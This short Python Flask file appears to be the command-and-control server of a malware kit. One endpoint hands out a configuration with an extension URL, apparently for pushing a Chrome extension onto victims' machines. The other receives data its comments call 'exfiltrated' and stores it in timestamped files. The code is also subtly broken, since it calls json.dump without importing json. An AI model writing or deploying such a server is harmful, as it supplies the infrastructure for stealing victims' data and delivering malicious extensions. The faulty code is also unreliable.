from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

# Directory to store exfiltrated data
DATA_DIR = "exfiltrated_data"
os.makedirs(DATA_DIR, exist_ok=True)

@app.route('/config', methods=['POST'])
def get_config():
    # Receive system info and return configuration
    system_info = request.json
    print("Received system info:", system_info)

    # Example configuration response
    config = {
        "ChromeProfilePath": None,  # Use default path
        "ExtensionUrl": "https://example.com/custom-extension.crx"
    }
    return jsonify(config)

@app.route('/api', methods=['POST'])
def receive_data():
    # Receive exfiltrated data
    data = request.json
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Save data to a file
    file_path = os.path.join(DATA_DIR, f"exfiltrated_data_{timestamp}.json")
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

    print(f"Data saved to {file_path}")
    return "Data received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
